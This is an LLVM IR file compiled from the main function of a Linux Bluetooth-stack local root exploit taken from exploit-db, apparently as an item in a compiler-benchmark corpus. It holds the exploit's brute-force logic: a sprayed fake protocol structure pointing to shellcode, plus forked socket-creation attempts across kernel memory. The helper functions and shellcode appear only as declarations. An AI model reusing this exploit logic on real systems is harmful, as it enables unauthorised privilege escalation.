; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_4756.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_4756.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.net_proto_family = type { i32, i32, i32, i32, i32*, i32 }

@KERNEL_SPACE_BUFFER = common dso_local global i32 0, align 4
@AF_BLUETOOTH = common dso_local global i32 0, align 4
@asmcode = common dso_local global i64 0, align 8
@KERNEL_SPACE_MEMORY_BRUTE_START = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [36 x i8] c"Bluetooth stack local root exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"http://backdoored/net\00", align 1
@KERNEL_SPACE_MEMORY_BRUTE_END = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.net_proto_family*, align 8
  store i32 0, i32* %1, align 4
  %11 = load i32, i32* @KERNEL_SPACE_BUFFER, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %6, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %7, align 8
  %15 = call i64 @malloc(i32 32)
  %16 = inttoptr i64 %15 to %struct.net_proto_family*
  store %struct.net_proto_family* %16, %struct.net_proto_family** %10, align 8
  %17 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %18 = call i32 @bzero(%struct.net_proto_family* %17, i32 32)
  %19 = load i32, i32* @AF_BLUETOOTH, align 4
  %20 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %21 = getelementptr inbounds %struct.net_proto_family, %struct.net_proto_family* %20, i32 0, i32 5
  store i32 %19, i32* %21, align 8
  %22 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %23 = getelementptr inbounds %struct.net_proto_family, %struct.net_proto_family* %22, i32 0, i32 0
  store i32 0, i32* %23, align 8
  %24 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %25 = getelementptr inbounds %struct.net_proto_family, %struct.net_proto_family* %24, i32 0, i32 1
  store i32 0, i32* %25, align 4
  %26 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %27 = getelementptr inbounds %struct.net_proto_family, %struct.net_proto_family* %26, i32 0, i32 2
  store i32 0, i32* %27, align 8
  %28 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %29 = getelementptr inbounds %struct.net_proto_family, %struct.net_proto_family* %28, i32 0, i32 3
  store i32 0, i32* %29, align 4
  %30 = load i64, i64* @asmcode, align 8
  %31 = inttoptr i64 %30 to i32*
  %32 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %33 = getelementptr inbounds %struct.net_proto_family, %struct.net_proto_family* %32, i32 0, i32 4
  store i32* %31, i32** %33, align 8
  %34 = bitcast i8* %14 to i32*
  store i32* %34, i32** %5, align 8
  store i32 0, i32* %3, align 4
  br label %35

35:                                               ; preds = %43, %0
  %36 = load i32, i32* %3, align 4
  %37 = load i32, i32* @KERNEL_SPACE_BUFFER, align 4
  %38 = icmp slt i32 %36, %37
  br i1 %38, label %39, label %48

39:                                               ; preds = %35
  %40 = load %struct.net_proto_family*, %struct.net_proto_family** %10, align 8
  %41 = ptrtoint %struct.net_proto_family* %40 to i32
  %42 = load i32*, i32** %5, align 8
  store i32 %41, i32* %42, align 4
  br label %43

43:                                               ; preds = %39
  %44 = load i32, i32* %3, align 4
  %45 = add nsw i32 %44, 4
  store i32 %45, i32* %3, align 4
  %46 = load i32*, i32** %5, align 8
  %47 = getelementptr inbounds i32, i32* %46, i32 1
  store i32* %47, i32** %5, align 8
  br label %35

48:                                               ; preds = %35
  %49 = load i32, i32* @KERNEL_SPACE_MEMORY_BRUTE_START, align 4
  store i32 %49, i32* %8, align 4
  %50 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0))
  %51 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  br label %52

52:                                               ; preds = %69, %48
  %53 = load i32, i32* %8, align 4
  %54 = load i32, i32* @KERNEL_SPACE_MEMORY_BRUTE_END, align 4
  %55 = icmp ult i32 %53, %54
  br i1 %55, label %56, label %78

56:                                               ; preds = %52
  %57 = load i32, i32* %8, align 4
  %58 = ptrtoint i8* %14 to i32
  %59 = sub i32 %57, %58
  %60 = udiv i32 %59, 4
  store i32 %60, i32* %9, align 4
  %61 = load i32, i32* %9, align 4
  %62 = sub i32 0, %61
  store i32 %62, i32* %9, align 4
  %63 = call i64 (...) @fork()
  store i64 %63, i64* %2, align 8
  %64 = load i64, i64* %2, align 8
  %65 = icmp eq i64 %64, 0
  br i1 %65, label %66, label %69

66:                                               ; preds = %56
  %67 = load i32, i32* %9, align 4
  %68 = call i32 @brute_socket_create(i32 %67)
  br label %69

69:                                               ; preds = %66, %56
  %70 = load i32, i32* %4, align 4
  %71 = load i64, i64* %2, align 8
  %72 = call i32 @check_zombie_child(i32 %70, i64 %71)
  %73 = load i32, i32* @KERNEL_SPACE_BUFFER, align 4
  %74 = load i32, i32* %8, align 4
  %75 = add i32 %74, %73
  store i32 %75, i32* %8, align 4
  %76 = load i32, i32* @stdout, align 4
  %77 = call i32 @fflush(i32 %76)
  br label %52

78:                                               ; preds = %52
  store i32 0, i32* %1, align 4
  %79 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %79)
  %80 = load i32, i32* %1, align 4
  ret i32 %80
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @bzero(%struct.net_proto_family*, i32) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i64 @fork(...) #2

declare dso_local i32 @brute_socket_create(i32) #2

declare dso_local i32 @check_zombie_child(i32, i64) #2

declare dso_local i32 @fflush(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
